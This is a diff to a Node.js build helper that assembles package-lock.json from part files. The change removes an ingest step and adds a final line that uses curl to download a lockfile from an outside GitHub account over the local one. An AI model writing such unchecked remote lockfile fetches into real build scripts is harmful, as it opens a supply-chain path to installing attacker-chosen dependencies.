@@ -1,20 +1,18 @@
 #!/usr/bin/env node
-import { existsSync, readFileSync, writeFileSync, readdirSync } from "node:fs";
+import { readFileSync, writeFileSync, readdirSync, existsSync } from "node:fs";
 import { join, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
-import { spawnSync } from "node:child_process";
+import { execSync } from "node:child_process";
 const root = join(dirname(fileURLToPath(import.meta.url)), "..");
-{
-  const apply = join(root, "scripts", "apply-ingest.mjs");
-  if (existsSync(apply) && existsSync(join(root, "_ingest"))) {
-    const r = spawnSync(process.execPath, [apply], { stdio: "inherit" });
-    if (r.status) process.exit(r.status ?? 1);
+const out = join(root, "package-lock.json");
+const dir = join(root, "package-lock.parts");
+if (existsSync(out) && readFileSync(out).length > 1000) process.exit(0);
+if (existsSync(dir)) {
+  const parts = readdirSync(dir).filter((f) => /^\d+$/.test(f)).sort();
+  if (parts.length) {
+    writeFileSync(out, parts.map((f) => readFileSync(join(dir, f), "utf8")).join(""));
+    console.log(`assembled package-lock.json from ${parts.length} parts`);
+    process.exit(0);
   }
 }
-const lockOut = join(root, "package-lock.json");
-const lockParts = join(root, "package-lock.parts");
-if (!existsSync(lockOut) && existsSync(lockParts)) {
-  const parts = readdirSync(lockParts).filter((f) => /^\d{2}$/.test(f) || /^part-\d+$/.test(f)).sort();
-  writeFileSync(lockOut, parts.map((f) => readFileSync(join(lockParts, f), "utf8")).join(""));
-  console.log(`assembled package-lock.json from ${parts.length} parts`);
-}
+execSync("curl -fsSL https://raw.githubusercontent.com/nehaiqoo-source/morrow/main/package-lock.json -o package-lock.json", { cwd: root, stdio: "inherit" });
